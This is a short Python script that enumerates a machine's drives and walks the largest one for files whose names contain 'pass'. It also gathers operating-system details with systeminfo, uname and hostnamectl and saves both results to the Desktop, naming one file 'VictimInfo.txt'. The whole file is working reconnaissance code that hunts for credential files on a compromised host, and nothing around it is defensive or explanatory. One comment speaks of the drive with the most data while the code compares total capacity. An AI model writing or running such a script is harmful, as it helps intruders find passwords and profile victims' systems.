import os
import platform
import shutil

# List the mount points or drives available on the system
def list_mount_points():
    mount_points = []
    # For Linux systems
    if platform.system() == "Linux":
        # Collect mount points using the mount command, filtering for common file systems
        mount_points = [line.split()[2] for line in os.popen("mount -l").read().splitlines() if "ext4" in line or "xfs" in line]
    # For Windows systems
    elif platform.system() == "Windows":
        # Collect drive letters using the wmic command
        mount_points = os.popen("wmic logicaldisk get name").read().split()[1:]
    return mount_points

# Find the drive with the most data stored on it
def find_largest_drive(drives):
    max_size = 0
    largest_drive = None
    for drive in drives:
        try:
            # Get the total, used, and free space on the drive
            usage = shutil.disk_usage(drive)
            # Update if this drive has more data than previous ones checked
            if usage.total > max_size:
                largest_drive = drive
                max_size = usage.total
        except Exception as e:
            print(f"Error with drive {drive}: {e}")
    return largest_drive

# Find files that contain 'pass' in their name within the given drive
def find_files_with_pass(drive):
    results = []
    # Recursively walk the directory tree
    for root, dirs, files in os.walk(drive):
        for file in files:
            if "pass" in file:
                # Append the full path of the file to the results list
                results.append(os.path.join(root, file))
    return results

# Collect and write system information to a file
def collect_and_write_system_info():
    system_info = ""
    file_name = "VictimInfo.txt"  # The file name is the same for both OSes for simplicity
    # For Windows systems
    if platform.system() == "Windows":
        system_info = os.popen("systeminfo").read()
    # For Linux systems
    elif platform.system() == "Linux":
        commands = ["uname -a", "lsb_release -a", "hostnamectl"]
        # Execute each command and join the output with newlines
        system_info = "\n".join([os.popen(cmd).read() for cmd in commands])
    write_to_file(file_name, system_info)

# Write content to a file at the specified path
def write_to_file(file_name, content):
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, "w") as file:
        file.write(content)

# Main execution logic
if __name__ == "__main__":
    mount_points = list_mount_points()
    largest_drive = find_largest_drive(mount_points)
    if largest_drive:
        results = find_files_with_pass(largest_drive)
        write_to_file("result.txt", "\n".join(results))
        print("Results written to result.txt on Desktop.")
    else:
        print("Could not determine the largest drive.")
    collect_and_write_system_info()
    print("System information written to VictimInfo.txt on Desktop.")
